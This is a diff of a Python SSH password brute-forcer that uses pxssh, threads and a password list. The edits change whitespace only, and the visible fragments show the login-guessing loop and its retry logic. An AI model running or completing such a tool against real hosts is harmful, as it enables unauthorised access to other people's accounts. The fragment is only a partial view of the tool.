@@ -11,7 +11,6 @@ Fails = 0
 def connect(host, user, password, release):
     global Found
     global Fails
-
     try:
         s = pxssh.pxssh()
         s.login(host, user, password)
@@ -25,7 +24,6 @@ def connect(host, user, password, release):
         elif 'synchronize with original prompt' in str(e):
             time.sleep(1)
             connect(host, user, password, False)
-
     finally:
         if release: connection_lock.release()
 
@@ -56,6 +54,7 @@ def main():
         connection_lock.acquire()
         password = line.strip('\r').strip('\n')
         print("[-] Testing: " + str(password))
+        
         t = Thread(target=connect, args=(host, user, password, True))
         child = t.start()
 
